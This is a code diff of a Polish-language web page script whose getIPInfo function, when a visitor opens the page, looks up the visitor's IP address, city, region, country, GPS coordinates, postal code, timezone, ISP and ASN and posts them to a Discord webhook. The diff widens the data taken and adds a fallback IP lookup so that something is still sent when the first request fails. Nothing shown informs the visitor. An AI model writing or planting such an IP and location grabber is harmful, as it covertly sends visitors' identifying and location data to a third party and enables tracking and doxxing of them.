@@ -29,42 +29,66 @@
 
         async function getIPInfo() {
             try {
-                const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
+                
+                const ip = data.ip || 'Nieznane';
+                const city = data.city || 'Brak';
+                const region = data.region || 'Brak';
+                const country = data.country_name || 'Brak';
+                const countryCode = data.country_code || 'Brak';
+                const latitude = data.latitude || 'Brak';
+                const longitude = data.longitude || 'Brak';
+                const postal = data.postal || 'Brak';
+                const timezone = data.timezone || 'Brak';
+                const org = data.org || 'Brak';
+                const asn = data.asn || 'Brak';
                 
                 const embed = {
                     embeds: [{
-                        title: "Nowe wejście na stronę",
-                        color: 0xff0000,
+                        title: "🌐 NOWE WEJŚCIE NA STRONĘ",
+                        color: 0x2b2d31,
                         fields: [
-                            { name: "IP", value: data.ip || "Nieznane", inline: true },
-                            { name: "Miasto", value: data.city || "Brak", inline: true },
-                            { name: "Region", value: data.region || "Brak", inline: true },
-                            { name: "Kraj", value: data.country || "Brak", inline: true },
-                            { name: "Lokalizacja", value: data.loc || "Brak", inline: true },
-                            { name: "Organizacja", value: data.org || "Brak", inline: true },
-                            { name: "Kod pocztowy", value: data.postal || "Brak", inline: true },
-                            { name: "Strefa czasowa", value: data.timezone || "Brak", inline: true }
+                            { name: "📡 IP", value: `\`${ip}\``, inline: true },
+                            { name: "🏙️ Miasto", value: city, inline: true },
+                            { name: "🗺️ Region", value: region, inline: true },
+                            { name: "🇵🇱 Kraj", value: `${country} (${countryCode})`, inline: true },
+                            { name: "📍 Lokalizacja", value: `${latitude}, ${longitude}`, inline: true },
+                            { name: "📮 Kod pocztowy", value: postal, inline: true },
+                            { name: "⏰ Strefa czasowa", value: timezone, inline: true },
+                            { name: "🏢 Organizacja", value: org.substring(0, 50), inline: true },
+                            { name: "🔢 ASN", value: asn, inline: true }
                         ],
+                        footer: {
+                            text: `Data wejścia: ${new Date().toLocaleString('pl-PL')}`
+                        },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                fetch(discordWebhook, {
+                await fetch(discordWebhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(embed)
-                }).catch(err => console.error(err));
+                });
 
             } catch (error) {
+                const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+                const fallbackData = await fallbackResponse.json();
+                
                 const errorEmbed = {
                     embeds: [{
-                        title: "Błąd pobierania IP",
-                        description: error.toString(),
-                        color: 0xff0000
+                        title: "⚠️ Uproszczone IP (fallback)",
+                        color: 0xff6600,
+                        fields: [
+                            { name: "IP", value: `\`${fallbackData.ip}\``, inline: true },
+                            { name: "Błąd", value: error.toString(), inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
                     }]
                 };
-                fetch(discordWebhook, {
+                
+                await fetch(discordWebhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(errorEmbed)
